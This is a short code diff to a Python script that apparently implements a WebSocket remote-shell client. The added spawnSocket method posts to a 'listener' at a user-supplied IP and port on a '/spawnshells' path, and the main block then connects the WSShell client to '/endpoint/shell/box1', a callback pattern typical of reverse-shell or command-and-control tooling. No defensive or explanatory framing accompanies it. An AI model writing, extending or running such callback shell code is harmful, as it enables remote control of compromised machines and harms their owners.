@@ -21,6 +21,17 @@ class runTime():
         f.close()
         pass
 
+    def spawnSocket(self, url):
+        params = urllib.urlencode({'user': 'f47h3r'})
+        try:
+            f = urllib.urlopen(url, params)
+        except IOError:
+            raise IOError('Connection To Listener Terminated. Exiting.')
+            sys.exit(1)
+        f.read()
+        f.close()
+        pass
+
 
 class WSShell(WebSocketClient):
     ip = ''
@@ -57,7 +68,8 @@ if __name__ == "__main__":
                       dest='ip',
                       help='Listener IP address')
     (options, args) = parser.parse_args()
-    runner = runTime()
+    socketSpawner = runTime()
+    socketSpawner.spawnSocket("http://" + options.ip + ":" + options.port + "/spawnshells")
     try:
         ws = WSShell('http://' + options.ip + ':' + options.port + '/endpoint/shell/box1', protocols=['http-only', 'chat'])
         ws.ip = options.ip
